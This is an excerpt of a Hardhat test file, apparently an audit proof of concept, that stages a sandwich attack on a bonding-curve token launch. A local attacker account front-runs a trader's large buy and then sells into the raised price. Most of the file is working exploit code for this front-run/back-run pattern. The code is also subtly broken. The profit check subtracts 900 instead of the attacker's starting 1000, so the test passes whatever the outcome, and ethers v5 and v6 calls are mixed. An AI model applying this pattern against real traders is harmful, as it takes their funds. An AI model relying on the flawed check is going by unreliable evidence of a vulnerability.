...
describe("Bonding Sandwich Attack PoC", function () {
...
//   });
  ...
  it("should be vulnerable to sandwich attacks", async function () {
    ...
    await virtualToken.mint(founder.address, parseEther("200"));
    await virtualToken.connect(founder).approve(bonding.target, parseEther("1000"));
    await virtualToken.mint(trader.address, parseEther("10000"));
    await virtualToken.connect(trader).approve(bonding.target, parseEther("10000"));
    await virtualToken.mint(attacker.address, parseEther("1000"));
    await virtualToken.connect(attacker).approve(bonding.target, parseEther("1000"));

    // Step 1: Founder launches a token
    console.log("1. Founder launches token");
    const launchTx = await bonding.connect(founder).launchFor(
      "VulToken",
      "$VUL",
      [0, 1, 2],
    ...
    const vulToken = await ethers.getContractAt("FERC20", tokenAddress);
    
    // Record initial state
    console.log("\nInitial State:");
    await logBalances(virtualToken, vulToken, founder, trader, attacker);
    
    // Step 2: Attacker front-runs by buying a small amount
    console.log("\n2. Attacker front-runs with small buy");
    await bonding.connect(attacker).buy(parseEther("100"), tokenAddress);
    await logBalances(virtualToken, vulToken, founder, trader, attacker);
    
    // Step 3: Trader makes a large buy that will move the price significantly
    console.log("\n3. Trader makes large buy (victim transaction)");
    await bonding.connect(trader).buy(parseEther("5000"), tokenAddress);
    await logBalances(virtualToken, vulToken, founder, trader, attacker);
    
    // Step 4: Attacker back-runs by selling tokens at higher price
    console.log("\n4. Attacker back-runs by selling tokens");
    const attackerBalance = await vulToken.balanceOf(attacker.address);
    await vulToken.connect(attacker).approve(bonding.target, attackerBalance);
    await bonding.connect(attacker).sell(attackerBalance, tokenAddress);
    
    // Calculate profit
    const finalAttackerBalance = await virtualToken.balanceOf(attacker.address);
    const profit = finalAttackerBalance.sub(parseEther("900"));
    
    console.log("\nFinal State:");
    await logBalances(virtualToken, vulToken, founder, trader, attacker);
    console.log(`Attacker profit: ${formatEther(profit)} VIRTUAL tokens`);
    
    // Profit should be positive, demonstrating the attack was successful
    expect(profit.gt(0)).to.be.true;
  });
  
  // Helper function to log balances
  async function logBalances(virtualToken, vulToken, founder, trader, attacker) {
    console.log(`Founder: ${formatEther(await virtualToken.balanceOf(founder.address))} VIRTUAL, ${formatEther(await vulToken.balanceOf(founder.address))} VUL`);
    console.log(`Trader: ${formatEther(await virtualToken.balanceOf(trader.address))} VIRTUAL, ${formatEther(await vulToken.balanceOf(trader.address))} VUL`);
    console.log(`Attacker: ${formatEther(await virtualToken.balanceOf(attacker.address))} VIRTUAL, ${formatEther(await vulToken.balanceOf(attacker.address))} VUL`);
    
    // Get price info from bonding contract
    const tokenInfo = await bonding.tokenInfo(vulToken.address);
    console.log(`Current price: ${tokenInfo.data.price / 1e18} VUL/VIRTUAL`);
  };
});
